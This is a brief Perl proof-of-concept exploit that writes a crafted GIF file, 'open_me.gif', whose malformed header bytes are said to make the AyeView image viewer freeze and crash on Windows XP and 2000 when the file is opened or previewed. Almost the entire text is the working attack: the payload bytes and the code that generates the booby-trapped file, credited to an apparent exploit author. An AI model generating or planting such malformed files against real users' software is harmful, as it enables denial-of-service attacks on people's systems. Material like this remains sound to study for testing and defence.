#!/usr/local/bin/perl   
# Open file (File->Open) or simply click on the image miniature
# AyeView freezes and after few seconds crashes...
# Tested on Windows XP SP2 & Windows 2000 SP4

my $code="\x47\x49\x46\x38\x39\x61\xff\xff\xff\xff\x0e".
         "\x00\x00\x2c\x00\x00\x00\x00\xff\xff\xff\xff\x00";
my $file="open_me.gif";

open(my $FILE, ">>$file") or die "[!]Cannot open file";
print $FILE $code;
close($FILE);
print "$file has been generated\n"
print "Credit: suN8Hclf, www.dark-coders.pl"

